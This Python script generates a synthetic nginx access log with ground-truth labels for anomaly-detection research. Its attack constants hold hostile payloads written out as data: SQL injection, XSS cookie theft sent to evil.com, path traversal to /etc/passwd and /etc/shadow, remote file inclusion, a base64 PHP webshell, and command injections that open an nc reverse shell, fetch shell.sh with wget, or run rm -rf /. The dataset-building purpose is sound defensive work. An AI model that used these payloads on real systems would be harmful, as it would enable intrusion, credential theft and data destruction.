#!/usr/bin/env python3
"""
Generates a large synthetic nginx access log (combined log format) for
anomaly-detection experiments (e.g. Isolation Forest).

10,000 total lines: 80% normal traffic, 20% anomalous, spanning several
days so the traffic looks like a real production system rather than a
single obviously-clustered day. Anomalies are woven into the timeline
at randomized points (plus a handful of realistic multi-step bursts)
rather than dumped in one visible block, and some attacks deliberately
"look" almost normal (200 status, ordinary-looking IP) to keep the
detection task non-trivial.

Output:
  data/access.log   - 10000 log lines
  data/labels.csv    - line_number,is_anomaly,category  (ground truth)
"""

import random
from datetime import datetime, timedelta

random.seed(2026)

N_TOTAL = 10000
N_ANOMALY = 2000
N_NORMAL = N_TOTAL - N_ANOMALY
N_DAYS = 4
BASE_DATE = datetime(2026, 7, 25, 0, 0, 0)

# ----------------------------------------------------------------------
# Normal traffic building blocks
# ----------------------------------------------------------------------

NORMAL_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/products/42",
    "/products/17", "/products/8", "/products/103", "/products/256",
    "/cart", "/checkout", "/login", "/logout", "/signup",
    "/api/v1/products", "/api/v1/users/me", "/api/v1/orders",
    "/api/v1/cart/items", "/api/v1/products/search",
    "/static/css/main.css", "/static/js/app.js", "/static/js/vendor.js",
    "/static/img/logo.png", "/static/img/banner.jpg", "/favicon.ico",
    "/blog", "/blog/how-to-choose-a-laptop", "/blog/top-10-gadgets",
    "/blog/summer-sale-guide", "/search?q=laptop", "/search?q=headphones",
    "/search?q=keyboard", "/help", "/faq", "/terms", "/privacy",
    "/account/settings", "/account/orders", "/robots.txt", "/sitemap.xml",
    "/newsletter/subscribe", "/reviews/42", "/reviews/17",
    "/wishlist", "/api/v1/health", "/api/v1/categories",
]

NORMAL_METHODS_WEIGHTED = ["GET"] * 80 + ["POST"] * 15 + ["HEAD"] * 5
NORMAL_STATUS_WEIGHTED = [200] * 78 + [304] * 12 + [404] * 6 + [301] * 3 + [500] * 1

NORMAL_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:126.0) Gecko/126.0 Firefox/126.0",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 "
    "(KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

REFERERS = [
    "-", "https://www.google.com/", "https://www.bing.com/",
    "https://shop.example.com/", "https://shop.example.com/products",
    "https://t.co/", "https://www.facebook.com/", "https://duckduckgo.com/",
]

# ----------------------------------------------------------------------
# Attack / anomaly building blocks
# ----------------------------------------------------------------------

SQLI_PATHS = [
    "/products?id=1' OR '1'='1",
    "/products?id=1;--",
    "/api/v1/users?id=1 UNION SELECT username,password FROM users--",
    "/login?user=admin'--&pass=x",
    "/search?q=1' AND SLEEP(5)--",
    "/products?id=-1 UNION SELECT 1,2,3,database()--",
    "/api/v1/orders?id=1 OR 1=1--",
    "/products?category=1' AND '1'='1",
    "/api/v1/products/search?q=%27%20UNION%20SELECT%20NULL--",
]

XSS_PATHS = [
    "/search?q=<script>alert(1)</script>",
    "/comment?text=<img src=x onerror=alert(document.cookie)>",
    "/profile?bio=%3Cscript%3Ealert('xss')%3C/script%3E",
    "/search?q=<svg/onload=alert(1)>",
    "/reviews/42?comment=<script>fetch('//evil.com/c?'+document.cookie)</script>",
]

PATH_TRAVERSAL_PATHS = [
    "/../../../../etc/passwd",
    "/static/../../../etc/shadow",
    "/download?file=../../../../windows/win.ini",
    "/api/v1/files?path=..%2f..%2f..%2fetc%2fpasswd",
    "/../../.env",
    "/static/img/..%2f..%2f..%2fetc%2fpasswd",
]

LFI_RFI_PATHS = [
    "/index.php?page=http://evil.example.com/shell.txt",
    "/index.php?page=../../../../proc/self/environ",
    "/api/v1/render?template=php://filter/convert.base64-encode/resource=index.php",
    "/include.php?file=http://malicious-host.net/backdoor.php",
    "/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOw==",
]

COMMAND_INJECTION_PATHS = [
    "/api/v1/ping?host=127.0.0.1;cat%20/etc/passwd",
    "/api/v1/convert?file=image.png|nc%20198.51.100.7%204444%20-e%20/bin/sh",
    "/api/v1/export?format=csv;wget%20http://evil.com/shell.sh",
    "/api/v1/backup?path=/tmp;rm%20-rf%20/",
    "/api/v1/ping?host=`curl+198.51.100.7`",
]

RECON_PATHS = [
    "/wp-login.php", "/wp-admin/", "/wp-content/plugins/",
    "/phpmyadmin/", "/.git/config", "/.env", "/administrator/",
    "/admin/config.php", "/xmlrpc.php", "/config.php.bak",
    "/.aws/credentials", "/server-status", "/actuator/env",
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/.well-known/security.txt", "/backup.sql", "/db_backup.zip",
]

SCANNER_UAS = [
    "sqlmap/1.7.11#stable (http://sqlmap.org)",
    "Nikto/2.5.0",
    "() { :; }; /bin/bash -c 'echo VULNERABLE'",
    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "masscan/1.3.2",
    "curl/8.4.0",
    "Mozilla/5.0 (compatible; ZmEu; www.exploit-db.com)",
    "Wget/1.21.3",
]

WEIRD_METHODS = ["PUT", "DELETE", "TRACE", "CONNECT", "PROPFIND", "PATCH"]

LONG_JUNK = "A" * 400

BRUTE_FORCE_USERNAMES = ["admin", "root", "test", "administrator", "user",
                          "guest", "info", "sa", "support", "webmaster"]

# ----------------------------------------------------------------------
# IP pools
# ----------------------------------------------------------------------

def random_public_ip():
    first = random.choice([24, 45, 66, 73, 82, 91, 104, 138, 157, 172, 185, 203, 41, 62, 89, 120])
    return f"{first}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

NORMAL_IP_POOL = [random_public_ip() for _ in range(150)]

# Dedicated "known bad" IPs, reused across a few categories so the
# dataset has a handful of repeat-offender addresses like real logs do.
ATTACKER_IPS = [random_public_ip() for _ in range(10)]

# A few attacks are deliberately launched from IPs that also appear in
# NORMAL_IP_POOL, to simulate compromised/legit-looking hosts and keep
# "IP reputation" from being a trivial giveaway feature.
STEALTH_IPS = random.sample(NORMAL_IP_POOL, 12)

# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------

def clf_time(dt):
    return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")

def make_line(ip, dt, method, path, status, size, referer, ua):
    return (
        f'{ip} - - [{clf_time(dt)}] "{method} {path} HTTP/1.1" '
        f'{status} {size} "{referer}" "{ua}"'
    )

HOUR_WEIGHTS = [1,1,1,1,1,2,3,5,7,9,10,10,9,9,10,10,9,8,7,6,5,4,3,2]

def random_time_diurnal(day=None, off_hours=False):
    d = day if day is not None else random.randint(0, N_DAYS - 1)
    if off_hours:
        hour = random.choice([1, 2, 3, 4, 5])
    else:
        hour = random.choices(range(24), weights=HOUR_WEIGHTS, k=1)[0]
    minute = random.randint(0, 59)
    second = random.randint(0, 59)
    return BASE_DATE + timedelta(days=d, hours=hour, minutes=minute, seconds=second)

def make_normal_entry(dt=None):
    ip = random.choice(NORMAL_IP_POOL)
    dt = dt or random_time_diurnal()
    method = random.choice(NORMAL_METHODS_WEIGHTED)
    path = random.choice(NORMAL_PATHS)
    status = random.choice(NORMAL_STATUS_WEIGHTED)
    if status == 404:
        size = random.randint(200, 500)
    elif status == 304:
        size = 0
    else:
        size = random.randint(500, 25000)
    referer = random.choice(REFERERS)
    ua = random.choice(NORMAL_USER_AGENTS)
    return [dt, make_line(ip, dt, method, path, status, size, referer, ua), 0, "normal"]

# ----------------------------------------------------------------------
# Build normal traffic
# ----------------------------------------------------------------------

entries = [make_normal_entry() for _ in range(N_NORMAL)]

# ----------------------------------------------------------------------
# Anomaly generators - each returns a list of entries
# ----------------------------------------------------------------------

def gen_sqli(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal()
        path = random.choice(SQLI_PATHS)
        # blended: sometimes looks like a normal 200, sometimes flagged
        status = random.choice([200, 200, 500, 403])
        size = random.randint(150, 4000)
        ua = random.choice(SCANNER_UAS + NORMAL_USER_AGENTS[:3])
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "sqli"])
    return out

def gen_xss(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal()
        path = random.choice(XSS_PATHS)
        status = random.choice([200, 400])
        size = random.randint(150, 2000)
        ua = random.choice(SCANNER_UAS + NORMAL_USER_AGENTS[:2])
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "xss"])
    return out

def gen_path_traversal(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal()
        path = random.choice(PATH_TRAVERSAL_PATHS)
        status = random.choice([403, 404, 200])
        size = random.randint(100, 1500)
        ua = random.choice(SCANNER_UAS)
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "path_traversal"])
    return out

def gen_lfi_rfi(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal()
        path = random.choice(LFI_RFI_PATHS)
        status = random.choice([200, 500, 403])
        size = random.randint(150, 3000)
        ua = random.choice(SCANNER_UAS + NORMAL_USER_AGENTS[:2])
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "lfi_rfi"])
    return out

def gen_command_injection(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS)
        dt = random_time_diurnal()
        path = random.choice(COMMAND_INJECTION_PATHS)
        status = random.choice([200, 500, 403])
        size = random.randint(100, 2500)
        ua = random.choice(SCANNER_UAS)
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "command_injection"])
    return out

def gen_unusual_method(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal()
        method = random.choice(WEIRD_METHODS)
        path = random.choice(["/", "/api/v1/orders", "/admin/", "/uploads/shell.php",
                               "/api/v1/products", "/api/v1/users/me"])
        status = random.choice([405, 501, 403, 200])
        size = random.randint(100, 500)
        ua = random.choice(SCANNER_UAS + NORMAL_USER_AGENTS[:2])
        out.append([dt, make_line(ip, dt, method, path, status, size, "-", ua), 1, "unusual_method"])
    return out

def gen_large_response_exfil(n):
    out = []
    for _ in range(n):
        ip = random.choice(NORMAL_IP_POOL + ATTACKER_IPS)
        dt = random_time_diurnal()
        path = random.choice(["/api/v1/export/full_database.csv",
                               "/api/v1/export/users.json",
                               "/api/v1/admin/backup.tar.gz"])
        status = 200
        size = random.randint(4_000_000, 22_000_000)
        ua = random.choice(NORMAL_USER_AGENTS + SCANNER_UAS)
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "large_response_exfil"])
    return out

def gen_off_hours_admin(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal(off_hours=True)
        path = random.choice(["/admin/config.php", "/admin/", "/account/settings", "/api/v1/admin/users"])
        status = random.choice([200, 403])
        size = random.randint(200, 1000)
        ua = random.choice(SCANNER_UAS + NORMAL_USER_AGENTS[:2])
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "off_hours_admin_access"])
    return out

def gen_shellshock(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS)
        dt = random_time_diurnal()
        path = random.choice(["/cgi-bin/test.cgi", "/cgi-bin/status", "/cgi-bin/php.cgi"])
        status = random.choice([404, 500])
        size = random.randint(100, 400)
        ua = "() { :; }; /bin/bash -c 'echo VULNERABLE'"
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "shellshock_probe"])
    return out

def gen_suspicious_ua_scan(n):
    """Scanner/bot UA hitting perfectly ordinary paths - blends in structurally,
    stands out only on the UA/rate feature."""
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal()
        path = random.choice(NORMAL_PATHS)
        status = random.choice(NORMAL_STATUS_WEIGHTED)
        size = random.randint(150, 5000)
        ua = random.choice(SCANNER_UAS)
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "suspicious_ua_scan"])
    return out

def gen_long_query_string(n):
    out = []
    for _ in range(n):
        ip = random.choice(ATTACKER_IPS + STEALTH_IPS)
        dt = random_time_diurnal()
        path = f"/search?q={LONG_JUNK}"
        status = random.choice([400, 414, 200, 500])
        size = random.randint(100, 800)
        ua = random.choice(NORMAL_USER_AGENTS + SCANNER_UAS)
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "long_query_string_anomaly"])
    return out

def gen_recon_scan_bursts(total, per_burst=10):
    """Several short recon sweeps scattered at random times/days instead
    of one giant obvious block."""
    out = []
    n_bursts = max(1, total // per_burst)
    for _ in range(n_bursts):
        ip = random.choice(ATTACKER_IPS)
        start = random_time_diurnal()
        ua = random.choice(SCANNER_UAS)
        for i in range(per_burst):
            dt = start + timedelta(seconds=i * random.uniform(1.5, 3.5))
            path = random.choice(RECON_PATHS)
            status = random.choice([404, 403, 400])
            size = random.randint(150, 600)
            out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "recon_scan"])
    return out[:total]

def gen_brute_force_bursts(total, per_burst=25):
    """Mix of a few fast bursts and a couple of 'low and slow' attempts
    (wider spacing, harder to spot on rate alone)."""
    out = []
    remaining = total
    while remaining > 0:
        size_this = min(per_burst, remaining)
        ip = random.choice(ATTACKER_IPS)
        start = random_time_diurnal()
        slow = random.random() < 0.3
        gap = random.uniform(20, 60) if slow else random.uniform(2, 4)
        for i in range(size_this):
            dt = start + timedelta(seconds=i * gap)
            user = random.choice(BRUTE_FORCE_USERNAMES)
            status = 401 if i < size_this - 1 else random.choice([401, 200])
            size = random.randint(80, 300)
            ua = random.choice(["python-requests/2.31.0", "curl/8.4.0"] + NORMAL_USER_AGENTS[:1])
            out.append([dt, make_line(ip, dt, "POST", "/login", status, size, "-", ua), 1, "brute_force"])
        remaining -= size_this
    return out[:total]

def gen_ddos_burst(total):
    """One high-rate burst from a single IP - a spike in request rate,
    otherwise fairly ordinary-looking requests."""
    ip = random.choice(ATTACKER_IPS)
    start = random_time_diurnal()
    out = []
    for i in range(total):
        dt = start + timedelta(milliseconds=i * random.randint(50, 200))
        path = random.choice(["/", "/api/v1/products", "/api/v1/health"])
        status = random.choice([200, 200, 503])
        size = random.randint(200, 3000)
        ua = random.choice(SCANNER_UAS[:3] + ["Go-http-client/1.1"])
        out.append([dt, make_line(ip, dt, "GET", path, status, size, "-", ua), 1, "ddos_burst"])
    return out

def gen_credential_stuffing(total, per_wave=20):
    """Many distinct IPs, many distinct usernames, all hitting /login in
    a short window - classic distributed credential stuffing pattern."""
    out = []
    remaining = total
    while remaining > 0:
        size_this = min(per_wave, remaining)
        start = random_time_diurnal()
        for i in range(size_this):
            ip = random_public_ip()  # fresh IP each time, not reused
            dt = start + timedelta(seconds=i * random.uniform(0.5, 2.0))
            user = random.choice(BRUTE_FORCE_USERNAMES) + str(random.randint(1, 99))
            status = random.choice([401, 401, 401, 200])
            size = random.randint(80, 300)
            ua = random.choice(["python-requests/2.31.0", "Go-http-client/1.1"])
            out.append([dt, make_line(ip, dt, "POST", "/login", status, size, "-", ua), 1, "credential_stuffing"])
        remaining -= size_this
    return out[:total]

# ----------------------------------------------------------------------
# Assemble anomalies (counts sum to N_ANOMALY = 2000)
# ----------------------------------------------------------------------

anomaly_entries = []
anomaly_entries += gen_sqli(250)
anomaly_entries += gen_xss(150)
anomaly_entries += gen_path_traversal(150)
anomaly_entries += gen_recon_scan_bursts(200)
anomaly_entries += gen_brute_force_bursts(150)
anomaly_entries += gen_unusual_method(120)
anomaly_entries += gen_large_response_exfil(80)
anomaly_entries += gen_off_hours_admin(100)
anomaly_entries += gen_shellshock(80)
anomaly_entries += gen_command_injection(150)
anomaly_entries += gen_lfi_rfi(120)
anomaly_entries += gen_suspicious_ua_scan(150)
anomaly_entries += gen_ddos_burst(100)
anomaly_entries += gen_long_query_string(100)
anomaly_entries += gen_credential_stuffing(100)

# Trim/pad to exactly N_ANOMALY
anomaly_entries = anomaly_entries[:N_ANOMALY]
while len(anomaly_entries) < N_ANOMALY:
    anomaly_entries += gen_sqli(1)

entries += anomaly_entries

# Trim/pad total to exactly N_TOTAL, then sort chronologically so it
# reads like one continuous, natural access log.
entries = entries[:N_TOTAL]
while len(entries) < N_TOTAL:
    entries.append(make_normal_entry())

entries.sort(key=lambda e: e[0])

# ----------------------------------------------------------------------
# Write outputs
# ----------------------------------------------------------------------

import os
os.makedirs("data", exist_ok=True)

with open("data/access.log", "w") as f:
    for e in entries:
        f.write(e[1] + "\n")

with open("data/labels.csv", "w") as f:
    f.write("line_number,is_anomaly,category\n")
    for i, e in enumerate(entries, start=1):
        f.write(f"{i},{e[2]},{e[3]}\n")

n_anom = sum(e[2] for e in entries)
print(f"Wrote {len(entries)} lines total, {n_anom} anomalous ({n_anom/len(entries)*100:.1f}%)")

from collections import Counter
cat_counts = Counter(e[3] for e in entries if e[2] == 1)
for cat, cnt in cat_counts.most_common():
    print(f"  {cat:28s} {cnt}")
